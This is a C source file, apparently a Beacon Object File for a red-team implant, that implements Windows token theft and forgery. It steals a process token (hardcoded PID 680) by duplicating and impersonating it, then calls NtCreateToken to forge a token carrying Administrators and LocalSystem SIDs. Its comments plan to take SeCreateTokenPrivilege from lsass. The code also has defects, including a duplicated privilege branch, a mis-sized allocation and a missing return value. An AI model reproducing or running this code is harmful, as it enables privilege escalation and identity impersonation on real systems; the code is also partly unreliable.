#include <Defs.h>
#include <base.c>

/*
 * todo:
 * 	create: create token using NtCreateToken (need SeCreateTokenPrivilege, steal it from lsass) and add it to the vault
 * 	remove: remove tokens from the vault
 * 	make: create a token using creds and put in the vault
 * 	steal: steal a token and place in the vault
 * 		- use duplication (NtDuplicateToken) to duplicate it and have impersonation/primary token
 * 		- might also use duplication to change the Impersonation Level
 * 		- Impersonation Level ignored on primary tokens ???
 * 	getuid: get the username of a token
 * 	info: get token information
 * 	impersonate: have an option to impersonate anonymous using NtImpersonateAnonymousToken
 * 		- thread impersonation -> need Impersonate access on the token, use NtSetInformationThread with ThreadImpersonationToken class
 * 		- you can impersonate a thread if you have the "Direct Impersonation" access, use NtImpersonateThread
 * 	set: change the information of a token -> enable/disable groups/privileges
 * 		- NtAdjustGroupsToken, NtAdujstPrivilegesToken (can also be used to remove a priv)
 * 	change integrity level?? SeTcpPrivilege is required for increasing -> Might then use with the func that can send callbacks to window to privesc
 * 	to decrease the integrity level nothing is required
 * 
 *  look into device groups, it's like groups for remote resources when it auths. Could have things like DOMAIN/COMPUTER1$
 *  privileges luid are small numbers so might be the same accross systems, resolve manually?
 * 
 * SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege -> bypass assigning token checking, but be enabled on process primary token, not impersonation token
 * can not change the primary token on a running process using NtSetInformationProcess, do it a suspended process maybe??
 */

typedef struct _TOKEN_VAULT {
	HANDLE Token;
	DWORD  Pid;
	struct _TOKEN_VAULT * Next;
} TOKEN_VAULT, * PTOKEN_VAULT;

typedef struct _CONTEXT_HEAP {
	ULONG        Context;
	PTOKEN_VAULT First;
};

#define CONTEXT 0xdeadbeef

VOID TokenLookupPrivilege(
	_In_ PLUID Luid,
	_Out_ PCHAR PrivName
) {

	if ( Luid->HighPart == 0 && Luid->LowPart == 2 ) MSVCRT$strcpy( PrivName, "SeCreateTokenPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 3 ) MSVCRT$strcpy( PrivName, "SeAssignPrimaryToken\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 4 ) MSVCRT$strcpy( PrivName, "SeLockMemoryPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 5 ) MSVCRT$strcpy( PrivName, "SeIncreaseQuotaPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 6 ) MSVCRT$strcpy( PrivName, "SeMachineAccountPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 7 ) MSVCRT$strcpy( PrivName, "SeTcbPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 8 ) MSVCRT$strcpy( PrivName, "SeSecurityPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 9 ) MSVCRT$strcpy( PrivName, "SeTakeOwnershipPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 10 ) MSVCRT$strcpy( PrivName, "SeLoadDriverPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 11 ) MSVCRT$strcpy( PrivName, "SeSystemProfilePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 12 ) MSVCRT$strcpy( PrivName, "SeSystemTimePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 13 ) MSVCRT$strcpy( PrivName, "SeProfSingleProcessPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 13 ) MSVCRT$strcpy( PrivName, "SeIncBasePriorityPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 14 ) MSVCRT$strcpy( PrivName, "SeIncBasePriorityPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 15 ) MSVCRT$strcpy( PrivName, "SeCreatePageFilePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 16 ) MSVCRT$strcpy( PrivName, "SeCreatePermanentPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 17 ) MSVCRT$strcpy( PrivName, "SeBackupPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 18 ) MSVCRT$strcpy( PrivName, "SeRestorePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 19 ) MSVCRT$strcpy( PrivName, "SeShutdownPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 20 ) MSVCRT$strcpy( PrivName, "SeDebugPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 21 ) MSVCRT$strcpy( PrivName, "SeAuditPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 22 ) MSVCRT$strcpy( PrivName, "SeSystemEnvironmentPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 23 ) MSVCRT$strcpy( PrivName, "SeChangeNotifyPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 24 ) MSVCRT$strcpy( PrivName, "SeRemoteShutdownPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 25 ) MSVCRT$strcpy( PrivName, "SeUndockPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 26 ) MSVCRT$strcpy( PrivName, "SeSyncAgentPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 27 ) MSVCRT$strcpy( PrivName, "SeEnableDelegationPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 28 ) MSVCRT$strcpy( PrivName, "SeManageVolumePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 29 ) MSVCRT$strcpy( PrivName, "SeImpersonatePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 30 ) MSVCRT$strcpy( PrivName, "SeCreateGlobalPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 31 )
		MSVCRT$strcpy( PrivName, "SeTrustedCredmanAccessPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 32 ) MSVCRT$strcpy( PrivName, "SeRelabelPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 33L ) MSVCRT$strcpy( PrivName, "SeIncWorkingSetPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 34 ) MSVCRT$strcpy( PrivName, "SeTimeZonePrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 35 ) MSVCRT$strcpy( PrivName, "SeCreateSymbolicLinkPrivilege\0" );
	else if ( Luid->HighPart == 0 && Luid->LowPart == 36 )
		MSVCRT$strcpy( PrivName, "SeDelegationSessionUserImpersonatePrivilege\0" );
}

/*!
 * @brief
 * 	query token information using NtQueryInformationToken
 *
 * @param Token
 * 	token to query the information of
 *
 * @return
 * 	ntstatus
 */
NTSTATUS TokenGetuid(
	_In_ HANDLE Token
) {

	/* interesting information to query
	 * Username + SID
	 * Privileges (Enabled/Disabled)
	 * Groups (Enabled/Disabled) + SID
	 * Impersonation Level -> whether you can impersonate the token
	 * Integrity Level
	 * GrantAccess: AssignPrimary, Duplicate, Impersonate...
	 * Elevated (just means has one of the following privs and so high privs) if it matches a certain RID, considered Elevated too
	 * 	- SeCreateTokenPrivilege, SeTcpPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeDelegationSessionUserImpersonatePrivilege
	 * Some privileged like SeDebugPrivilege can not be enabled on non-high integrity level processes
	 */

	NTSTATUS                     Status                  = { 0 };
	PTOKEN_USER                  UserInfo                = { 0 };
	ULONG                        Size                    = { 0 };
	PCHAR                        Domain                  = { 0 };
	PCHAR                        User                    = { 0 };
	DWORD                        UserLen                 = { 0 };
	DWORD                        DomainLen               = { 0 };
	SID_NAME_USE                 SidType                 = { 0 };
	PTOKEN_GROUPS_AND_PRIVILEGES GroupsAndPrivilegesInfo = { 0 };
	CHAR                         PrivName[MAX_PATH]      = { 0 };
	PLUID_AND_ATTRIBUTES         Priv                    = { 0 };
	PSID_AND_ATTRIBUTES          Group                   = { 0 };
	UNICODE_STRING               SidSddl                 = { 0 };

	// query the user sid
	// get the size first
	NTDLL$NtQueryInformationToken( Token, TokenUser, UserInfo, 0, & Size );

	// allocate memory for the sid
	UserInfo = KERNEL32$LocalAlloc( LPTR, Size );

	// get the sid
	if ( ! NT_SUCCESS( Status = NTDLL$NtQueryInformationToken( Token, TokenUser, UserInfo, Size, & Size ) ) ) {
		PRINT_NT_ERROR( "NtQueryInformationToken", Status );
		return Status;
	}

	// convert the sid to a username and domain
	// get the size first
	ADVAPI32$LookupAccountSidA( NULL, UserInfo->User.Sid, NULL, & UserLen, NULL, & DomainLen, & SidType );

	// allocate memory for sid and domain
	User   = KERNEL32$LocalAlloc( LPTR, UserLen );
	Domain = KERNEL32$LocalAlloc( LPTR, DomainLen );

	// convert the sid to a username and domain
	if ( ! ADVAPI32$LookupAccountSidA( NULL, UserInfo->User.Sid, User, & UserLen, Domain, & DomainLen, & SidType ) ) {
		internal_printf( "[!] LookupAccountSidA failed with error: %d\n", NtCurrentTeb()->LastErrorValue );
		return - 1;
	}

	// get the sid as SDDL
	if ( ! NT_SUCCESS( Status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, UserInfo->User.Sid, TRUE ) ) ) {
		PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", Status );
		return - 1;
	}

	internal_printf( "User: %s\\%s - %ls", Domain, User, SidSddl.Buffer );
	NTDLL$RtlFreeUnicodeString( & SidSddl );

	// query group and privileges
	NTDLL$NtQueryInformationToken( Token, TokenGroupsAndPrivileges, GroupsAndPrivilegesInfo, 0, & Size );

	// allocate memory for the groups and privileges
	GroupsAndPrivilegesInfo = KERNEL32$LocalAlloc( LPTR, sizeof( Size ) );

	// get the sid
	if ( ! NT_SUCCESS( Status = NTDLL$NtQueryInformationToken(
		Token,
		TokenGroupsAndPrivileges,
		GroupsAndPrivilegesInfo,
		Size,
		& Size
	) ) ) {
		internal_printf( "[!] NtQueryInformationToken failed with error: 0x%04X\n", Status );
		return Status;
	}

	// loop through privileges
	for ( int PrivCnt = 0 ; PrivCnt < GroupsAndPrivilegesInfo->PrivilegeCount ; PrivCnt ++ ) {

		Priv = & GroupsAndPrivilegesInfo->Privileges[ PrivCnt ];

		TokenLookupPrivilege( & Priv->Luid, PrivName );

		if ( Priv->Attributes & SE_PRIVILEGE_ENABLED ) {
			internal_printf( "%s :  Enabled\n", PrivName );
		} else {
			internal_printf( "%s : Disabled\n", PrivName );
		}
	}

	/*
	for ( int SidCnt = 0 ; SidCnt < GroupsAndPrivilegesInfo->SidCount ; SidCnt ++ ) {

		Group = & GroupsAndPrivilegesInfo->Sids[ SidCnt ];

		// get the sid as SDDL
		if ( ! NT_SUCCESS( Status = NTDLL$RtlConvertSidToUnicodeString( & SidSddl, Group->Sid, TRUE ) ) ) {
			PRINT_NT_ERROR( "RtlConvertSidToUnicodeString", Status );
			return - 1;
		}

		internal_printf( "Group: %ls\n", SidSddl.Buffer );
		NTDLL$RtlFreeUnicodeString( & SidSddl );
	}
	 */

	return STATUS_SUCCESS;
}

/*!
 * @brief
 * 	steal the token of a process with the DUPLICATE access mask
 *
 * @param Pid
 * 	pid of the process to steal the token
 *
 * @return
 * 	token of the process
 */
HANDLE TokenSteal(
	_In_ ULONG Pid
) {

	NTSTATUS                    Status       = { 0 };
	PSYSTEM_PROCESS_INFORMATION ProcInfo     = { 0 };
	PSYSTEM_PROCESS_INFORMATION ProcInfoFree = { 0 };
	ULONG                       ProcSize     = { 0 };
	HANDLE                      Proc         = { 0 };
	HANDLE                      Token        = { 0 };
	OBJECT_ATTRIBUTES           Attr         = { 0 };

	// ntdll!NtOpenProcess needs a thread id, let's do process enum to get one of its thread using ntdll!NtQuerySystemInformation
	// get the required buffer size
	NTDLL$NtQuerySystemInformation( SystemProcessInformation, NULL, 0, & ProcSize );

	// alloc memory
	// make a copy of where the buffer is allocated to free it later, as the pointer will change
	ProcInfo = ProcInfoFree = KERNEL32$LocalAlloc( LPTR, ProcSize );

	if ( ! NT_SUCCESS( Status = NTDLL$NtQuerySystemInformation(
		SystemProcessInformation,
		ProcInfo,
		ProcSize,
		& ProcSize
	) ) ) {
		PRINT_NT_ERROR( "NtQuerySystemInformation", Status );
		goto END;
	}

	// loop through the processes
	while ( TRUE ) {
		if ( ProcInfo->UniqueProcessId == ( HANDLE ) Pid ) {

			// get a handle onto that process
			if ( ! NT_SUCCESS( Status = NTDLL$NtOpenProcess(
				& Proc,
				PROCESS_QUERY_LIMITED_INFORMATION,
				& Attr,
				& ProcInfo->Threads[ 0 ].ClientId
			) ) ) {
				PRINT_NT_ERROR( "NtOpenProcess", Status );
				goto END;
			}

			// query the token of that process
			if ( ! NT_SUCCESS( Status = NTDLL$NtOpenProcessTokenEx(
				Proc,
				TOKEN_DUPLICATE | TOKEN_QUERY,
				0,
				& Token
			) ) ) {
				PRINT_NT_ERROR( "NtOpenProcessTokenEx", Status );
				goto END;
			}

			// store the token


			// print the token
			internal_printf( "[+] Successfully stole token of process with id %ld: 0x%08X\n", Pid, Token );
			break;
		}

		// quit the loop if it was the last element
		if ( ! ProcInfo->NextEntryOffset ) {
			internal_printf( "[-] Failed to find process with pid %ld\n", Pid );
			break;
		}

		// set ProcInfo to the next element
		ProcInfo = ( PSYSTEM_PROCESS_INFORMATION ) ( C_PTR( ProcInfo ) + ProcInfo->NextEntryOffset );
	}

	END:
	// free the process buffer
	if ( ProcInfoFree ) {
		KERNEL32$LocalFree( ProcInfoFree );
	}

	return Token;
}

NTSTATUS TokenImpersonate(
	_In_ HANDLE Token
) {

	NTSTATUS                    Status   = { 0 };
	HANDLE                      NewToken = { 0 };
	OBJECT_ATTRIBUTES           ObjAttr  = { 0 };
	SECURITY_QUALITY_OF_SERVICE Sqos     = { 0 };

	Sqos.Length              = sizeof( SECURITY_QUALITY_OF_SERVICE );
	Sqos.ImpersonationLevel  = SecurityImpersonation;
	Sqos.ContextTrackingMode = 0;
	Sqos.EffectiveOnly       = FALSE;

	InitializeObjectAttributes( & ObjAttr, NULL, 0, NULL, 0 );
	ObjAttr.SecurityQualityOfService = & Sqos;

	// duplicate the token to make it an impersonation token
	if ( ! NT_SUCCESS( Status = NTDLL$NtDuplicateToken(
		Token,
		TOKEN_ALL_ACCESS,
		& ObjAttr,
		FALSE,
		TokenImpersonation,
		& NewToken
	) ) ) {
		PRINT_NT_ERROR( "NtDuplicateToken", Status );
		return Status;
	}

	// impersonate the token
	if ( ! NT_SUCCESS( Status = NTDLL$NtSetInformationThread(
		NtCurrentThread(),
		ThreadImpersonationToken,
		& NewToken,
		sizeof( NewToken )
	) ) ) {
		PRINT_NT_ERROR( "NtSetInformationThread", Status );
		return Status;
	}
}

VOID TokenRev2Self(
	VOID
) {

	NTSTATUS Status = { 0 };
	HANDLE   Token  = { 0 };

	if ( ! NT_SUCCESS( Status = NTDLL$NtSetInformationThread(
		NtCurrentThread(),
		ThreadImpersonationToken,
		& Token,
		sizeof( Token )
	) ) ) {
		PRINT_NT_ERROR( "NtSetInformationThread", Status );
	}
}

VOID TokenCreate(
	VOID
) {

	NTSTATUS                    Status           = { 0 };
	HANDLE                      Token            = { 0 };
	OBJECT_ATTRIBUTES           ObjAttr          = { 0 };
	SECURITY_QUALITY_OF_SERVICE Sqos             = { 0 };
	LARGE_INTEGER               ExpTime          = { 0 };
	DWORD                       SidSize          = { 0 };
	SID_IDENTIFIER_AUTHORITY    AuthoritySid     = SECURITY_MANDATORY_LABEL_AUTHORITY;
	TOKEN_GROUPS_MULTI          Groups           = { 0 };
	TOKEN_PRIVILEGES_MULTI      Privs            = { 0 };
	TOKEN_PRIMARY_GROUP         PrimaryGroup     = { 0 };
	TOKEN_USER                  User             = { 0 };
	LUID                        AuthenticationId = { .HighPart = 0, .LowPart = 999 };
	TOKEN_SOURCE                Source           = { "Ch11", 777 };

	// initialize the attributes
	Sqos.Length              = sizeof( SECURITY_QUALITY_OF_SERVICE );
	Sqos.ImpersonationLevel  = SecurityImpersonation;
	Sqos.ContextTrackingMode = 0;
	Sqos.EffectiveOnly       = FALSE;

	InitializeObjectAttributes( & ObjAttr, NULL, 0, NULL, 0 );
	ObjAttr.SecurityQualityOfService = & Sqos;

	// allocate 6 groups
	Groups.GroupCount = 6;
	Groups.Groups     = KERNEL32$LocalAlloc( LPTR, Groups.GroupCount * sizeof( SID_AND_ATTRIBUTES ) );

	// initialize the group sids
	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinBuiltinAdministratorsSid, NULL, & Groups.Groups[ 0 ].Sid, & SidSize );
	Groups.Groups[ 0 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED | SE_GROUP_OWNER;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinWorldSid, NULL, & Groups.Groups[ 1 ].Sid, & SidSize );
	Groups.Groups[ 1 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinInteractiveSid, NULL, & Groups.Groups[ 2 ].Sid, & SidSize );
	Groups.Groups[ 2 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinLocalSystemSid, NULL, & Groups.Groups[ 3 ].Sid, & SidSize );
	Groups.Groups[ 3 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	if ( ! NT_SUCCESS( Status = NTDLL$RtlAllocateAndInitializeSid(
		& AuthoritySid,
		1,
		SECURITY_MANDATORY_MEDIUM_RID,
		0, 0, 0, 0, 0, 0, 0,
		& Groups.Groups[ 4 ].Sid
	) ) ) {
		PRINT_NT_ERROR( "RtlAllocateAndInitializeSid", Status );
	}
	Groups.Groups[ 4 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	SidSize = sizeof( SID );
	ADVAPI32$CreateWellKnownSid( WinAuthenticatedUserSid, NULL, & Groups.Groups[ 5 ].Sid, & SidSize );
	Groups.Groups[ 5 ].Attributes = SE_GROUP_DEFAULTED | SE_GROUP_ENABLED;

	// initialize the privileges
	Privs.PrivilegeCount = 2;
	Privs.Privileges     = KERNEL32$LocalAlloc( LPTR, Privs.PrivilegeCount * sizeof( SID_AND_ATTRIBUTES ) );

	Privs.Privileges[ 0 ].Attributes   = SE_PRIVILEGE_ENABLED_BY_DEFAULT;
	Privs.Privileges[ 0 ].Luid.LowPart = SE_CHANGE_NOTIFY_PRIVILEGE;
	Privs.Privileges[ 1 ].Luid.LowPart = SE_TCB_PRIVILEGE;

	// initialize primary group
	// does not really matter, for POSIX compability
	PrimaryGroup.PrimaryGroup = & Groups.Groups[ 0 ].Sid;

	// the user
	User.User.Sid = & Groups.Groups[ 3 ].Sid;

	if ( ! NT_SUCCESS( Status = NTDLL$NtCreateToken(
		& Token,
		TOKEN_ALL_ACCESS,
		& ObjAttr,
		TokenImpersonation,
		& AuthenticationId, // TODO: Enumerate logon sessions using LsaEnumerateLogonSessions
		& ExpTime,
		& User, // TOKEN_USER struct
		( PTOKEN_GROUPS ) & Groups, // TOKEN_GROUP struct
		( PTOKEN_PRIVILEGES ) & Privs, // Privilege
		NULL, // TOKEN_OWNER struct
		& PrimaryGroup, // Primary group, one of the group in TOKEN_GROUP
		NULL,
		& Source// Token source
	) ) ) {
		PRINT_NT_ERROR( "NtCreateToken", Status );
	} else {
		internal_printf( "Successfully created token!" );
	}

}

VOID go(
	_In_ PCHAR Buffer,
	_In_ ULONG Length
) {

	NTSTATUS Status = { 0 };
	HANDLE   Token  = { 0 };

	if ( ! bofstart() ) {
		return;
	}

	// call your function here
	if ( ( Token = TokenSteal( 680 ) ) ) {
		if ( NT_SUCCESS ( TokenImpersonate( Token ) ) ) {
			TokenCreate();
		}
	}

	printoutput( TRUE );
};